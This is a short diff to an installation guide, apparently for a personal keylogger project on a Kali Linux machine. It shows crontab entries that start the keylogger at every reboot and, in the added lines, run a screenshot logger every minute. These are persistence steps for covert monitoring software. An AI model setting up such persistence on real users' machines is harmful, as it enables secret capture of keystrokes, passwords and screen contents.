@@ -16,5 +16,8 @@ Installation Guide
 	choose vim
 	Edit crontab
 		'@reboot /home/kali/python/keylogger_project/keylogger_project.py'
-6. Screenshot logger does not run at boot and has to be started manually.
-	'./screenshot.py'
+6. Make a crontab entry to run screenlogger every minute
+	'crontab -e'
+	choose vim
+	Edit crontab
+		'* * * * * /home/kali/python/keylogger_project/screenshot.py'
